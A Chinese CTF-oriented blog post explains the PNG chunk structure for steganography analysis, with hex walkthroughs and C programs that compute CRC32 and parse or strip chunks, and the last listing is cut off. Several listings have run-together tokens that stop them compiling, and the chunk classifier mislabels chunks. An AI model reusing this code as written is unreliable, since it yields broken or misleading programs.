<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>PNG在隐写中的应用 | Peterpan&#39;s Blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="CTF">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/style.css?v=1.0.7">
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":true,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":true,"appid":null,"appkey":null,"notify":false,"verify":false,"placeholder":"give me some sugers plz...","avatar":"wavatar"}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/bg.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/miao_icon.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Peter pan</h5>
          <a href="mailto:1549346936@qq.com" title="1549346936@qq.com" class="mail">1549346936@qq.com</a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/Peterpan0927" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/Peterpan0927" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>PNG在隐写中的应用</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <div class="container fade-scale">
        <h1 class="title">PNG在隐写中的应用</h1>
        <h5 class="subtitle">
            
                <time datetime="2017-10-29T07:03:53.000Z" itemprop="datePublished" class="page-time">
  2017-10-29
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/文件格式-数据隐藏/">文件格式 数据隐藏</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-PNG在隐写中的应用"
  class="post-article article-type-post fade" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">PNG在隐写中的应用</h1>
        <div class="post-meta">
            <time class="post-time" title="2017-10-29 15:03:53" datetime="2017-10-29T07:03:53.000Z"  itemprop="datePublished">2017-10-29</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/文件格式-数据隐藏/">文件格式 数据隐藏</a></li></ul>



            
	<span id="/2017/10/29/PNG在隐写中的应用/" class="leancloud_visitors" data-flag-title="PNG在隐写中的应用" title="PNG在隐写中的应用">
		
			<i class="icon icon-eye"></i>
		
		<span class="leancloud-visitors-count"></span>
	</span>
 

            
    <span>
        <i class="icon icon-comment-o"></i>
        <a href="/2017/10/29/PNG在隐写中的应用/#comment">
            <span class="valine-comment-count" data-xid="/2017/10/29/PNG在隐写中的应用/"></span>
        </a>
    </span>


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <p>让我们一起来了解一下png图片的构成吧～知其然亦知其所以然</p>
<a id="more"></a>
<h2 id="00x0-前言"><a class="markdownIt-Anchor" href="#00x0-前言"></a> 00X0-前言</h2>
<p>其实是在研究隐写术的时候遇到了瓶颈，所以决定去系统的了解一下png的文件格式做一个总结，到这个阶段的隐写术不可能是单纯的三板斧解决的问题，以前为了做题总是将工具当作了主导，其实这样是不对的。工具只能起一部分的分析作用，自身的知识储备才是最重要的部分，否则始终都只是一个<code>script kid</code>。在这里向道哥致敬～</p>
<h2 id="0x01-png文件格式"><a class="markdownIt-Anchor" href="#0x01-png文件格式"></a> 0X01-PNG文件格式</h2>
<p><strong>1、PNG文件署名域</strong></p>
<p>前8字节</p>
<p>固定格式，16进制为： 89 504e 47 0d 0a 1a 0a</p>
<p><strong>2、数据块</strong></p>
<p>Chunk Type Code(数据块类型码): 4字节,数据块类型码</p>
<p>Chunk Data(数据块数据): 可变长度,存储数据</p>
<p>CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码</p>
<p>数据块类型：</p>
<p><strong>1. 关键数据块(criticalchunk)</strong></p>
<p>(1) 文件头数据块IHDR(headerchunk) - 包含PNG文件的基本信息 - 一个PNG数据流中只能有一个IHDR - 必须在PNG文件最前面</p>
<p>(2) 调色板数据块PLTE(palettechunk) - 包含有与索引彩色图像(indexed-color image)相关的彩色变换数据 - 必须在IDAT之前</p>
<p>(3) 图像数据块IDAT(imagedata chunk) - 存储实际的数据 - 可存在多个 -必须与其他IDAT连续</p>
<p>(4) 图像结束数据IEND(imagetrailer chunk) - 固定格式，16进制为： 0000 00 00 49 45 4E 44 AE 42 60 82 - 必须在PNG文件最尾部</p>
<p><strong>2. 辅助数据块(ancillarychunk)</strong></p>
<p>用于辅助指示PNG图像中的层、文字等信息</p>
<p>可删除，不影响图片浏览，但图像将失去原来的可编辑性</p>
<p>(1) 背景颜色数据块bKGD(backgroundcolor)</p>
<p>(2) 基色和白色度数据块cHRM(primarychromaticities and white point)</p>
<p>(3) 图像γ数据块gAMA(image gamma)</p>
<p>(4) 图像直方图数据块hIST(imagehistogram)</p>
<p>(5) 物理像素尺寸数据块pHYs(physicalpixel dimensions)</p>
<p>(6) 样本有效位数据块sBIT(significantbits)</p>
<p>(7) 文本信息数据块tEXt(textualdata)</p>
<p>(8) 图像最后修改时间数据块tIME(image last-modification time)</p>
<p>(9) 图像透明数据块tRNS(transparency)</p>
<p>(10) 压缩文本数据块zTXt(compressed textual data)</p>
<h2 id="0x02-实例图片分析"><a class="markdownIt-Anchor" href="#0x02-实例图片分析"></a> 0x02-实例图片分析</h2>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.36.18.png" alt="屏幕快照 2017-10-29 下午2.36.18.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.36.18.png</p>
            </figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.37.29.png" alt="屏幕快照 2017-10-29 下午2.37.29.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.37.29.png</p>
            </figure>
<ol>
<li>png文件署名域</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//固定格式</span></div><div class="line"><span class="number">89</span> <span class="number">50</span> <span class="number">4</span>e <span class="number">47</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">1</span>a <span class="number">0</span>a</div></pre></td></tr></table></figure>
<p>据块结构：</p>
<p>Length: 00 00 00 0D</p>
<p>前4字节，定义长度，00 00 000D十进制为13，代表长度为13个字节</p>
<p>Chunk Type Code： 4948 44 52</p>
<p>4字节，定义数据块类型码，此处为IHDR</p>
<p>Chunk Data： 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
<p>共13字节，定义数据内容</p>
<p>CRC： 4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值</p>
<p>即对以下十六进制作计算： 49 48 44 52 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
<p>我们可以编写程序对CRC算法进行一次验证；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">char</span>* InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span>  Crc32Table[<span class="number">256</span>];     </div><div class="line"> <span class="keyword">int</span> i,j;        </div><div class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line"> <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">            Crc= i;        </div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">              <span class="keyword">if</span> (Crc &amp; <span class="number">1</span>)        </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">              <span class="keyword">else</span>      </div><div class="line">                        Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">            &#125;        </div><div class="line">            Crc32Table[i]= Crc;        </div><div class="line"> &#125;        </div><div class="line"> Crc=<span class="number">0xffffffff</span>;        </div><div class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">            Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line"> 	&#125;     </div><div class="line"> 	Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line"> 	<span class="keyword">return</span> Crc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            <span class="keyword">char</span> buf[<span class="number">17</span>]=&#123;<span class="number">0x49</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x52</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x1A</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x1A</span>,<span class="number">0x08</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>&#125;;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=GetCrc32(buf,<span class="keyword">sizeof</span>(buf));</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%08X\n"</span>,crc32);</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行程序之后发现算出来的CRC校验准确无误，那么从这里我们就可以想到就算是在，Unix/linux系统上修改了图片的宽高之后与CRC校验不符，也可以通过这种方a式来修改CRC校验，hhh，那么就不需要该死的windows了。</p>
<p><strong>(2) gAMA</strong></p>
<blockquote>
<p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B18F 0B FC 61 05</p>
</blockquote>
<blockquote>
<p>….gAMA…睆.黙.</p>
</blockquote>
<p>数据块结构：</p>
<p>Length: 00 00 00 04</p>
<p>Chunk Type Code： 6741 4D 41</p>
<p>Chunk Data： 00 00B1 8F</p>
<p>CRC： 0B FC 61 05</p>
<p><strong>(3) cHRM</strong></p>
<blockquote>
<p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A26 00 00 80 84 ; … cHRM…z&amp;…€? 00000041h: 00 00 FA 00 00 00 80 E8 00 00 7530 00 00 EA 60</p>
</blockquote>
<blockquote>
<p>…?..€?.u0…阘 00000051h: 00 00 3A 9800 00 17 70 9C BA 51 3C ; …:?..p満Q&lt;</p>
</blockquote>
<p>数据块结构：</p>
<p>Length: 00 00 00 20</p>
<p>Chunk Type Code： 6348 52 4D</p>
<p>Chunk Data： 00 007A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 9800 00 17 70</p>
<p>CRC： 9C BA 51 3C</p>
<p><strong>(4) IDAT</strong></p>
<p><strong>(5-14) tEXt</strong></p>
<p><strong>(15)IEND</strong></p>
<p>数据块结构：</p>
<p>Length: 00 00 00 00</p>
<p>Chunk Type Code： 4945 4E 44</p>
<p>Chunk Data：</p>
<p>CRC： AE 42 60 82</p>
<p>固定结构，CRC的值为对ChunkType Code作CRC32校验</p>
<h2 id="0x03-编写程序分析文件格式"><a class="markdownIt-Anchor" href="#0x03-编写程序分析文件格式"></a> 0x03-编写程序分析文件格式</h2>
<p>开发工具：vc6.0、dev-c++、codeblocks</p>
<ol>
<li>读取PNG文件</li>
</ol>
<p>保存为example2.cpp，代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE *fp;   </div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;   </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            <span class="keyword">int</span> len=ftell(fp);</div><div class="line">            unsignedchar *buf=<span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>[len];      </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"len=%d\n"</span>,len);</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)</div><div class="line">            &#123;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"%02X"</span>,buf[i<span class="number">-1</span>]);</div><div class="line">                        <span class="keyword">if</span>(i%<span class="number">16</span>==<span class="number">0</span>)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">            &#125;</div><div class="line">            fclose(fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如图，程序按照UltraEdit的格式输出，以便后续的格式分析:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.56.48.png" alt="屏幕快照 2017-10-29 下午2.56.48.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.56.48.png</p>
            </figure>
<ol start="2">
<li>解析数据块结构</li>
</ol>
<p>从第8字节开始，读前四字节为ChunkLength</p>
<p>对应的代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> intChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div></pre></td></tr></table></figure>
<p>接着四字节为ChunkName</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">"ChunkName:%c%c%c%c\n"</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div></pre></td></tr></table></figure>
<p>然后根据ChunkLength读出完整的ChunkData</p>
<p>最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较</p>
<p>保存为check.cpp,完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                        Crc= i;        </div><div class="line">                        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                    <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                                Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                    <span class="keyword">else</span>       </div><div class="line">                                                Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                        &#125;        </div><div class="line">                        Crc32Table[i]= Crc;        </div><div class="line">            &#125;        </div><div class="line">            Crc=<span class="number">0xffffffff</span>;        </div><div class="line">            <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line">            &#125;     </div><div class="line">            Crc ^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">            returnCrc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE*fp;   </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;   </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            len=ftell(fp);</div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">            fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">            ChunkOffset=<span class="number">8</span>;</div><div class="line">            i=<span class="number">0</span>;</div><div class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                        i++;</div><div class="line">                        <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                 "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                        <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkLen: %10d              \n"</span>,ChunkLen);</div><div class="line">                        ChunkOffset+=ChunkLen+<span class="number">12</span>;</div><div class="line">                        crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32: %08X                     "</span>,ChunkCRC32);</div><div class="line">                        <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                        ChunkLen=ftell(fp);</div><div class="line">                        <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                        </div><div class="line">                                    <span class="keyword">break</span>;</div><div class="line">                        &#125;</div><div class="line">            &#125;</div><div class="line">            fclose(fp);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行如图，可获得完整的PNG文件结构:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.58.01.png" alt="屏幕快照 2017-10-29 下午2.58.01.png" title="" class="">
                <p>屏幕快照 2017-10-29 下午2.58.01.png</p>
            </figure>
<p>注：这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。</p>
<h2 id="0x04-去除多余数据"><a class="markdownIt-Anchor" href="#0x04-去除多余数据"></a> 0x04-去除多余数据</h2>
<p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>
<ol>
<li>工具实现</li>
</ol>
<p>使用Hex Editor去除辅助数据块gAMA、cHRM和bKGD</p>
<p>文件大小变化，但不影响PNG文件浏览</p>
<ol start="2">
<li>程序实现</li>
</ol>
<p>去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png</p>
<p>保存为compress.cpp,完整代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div 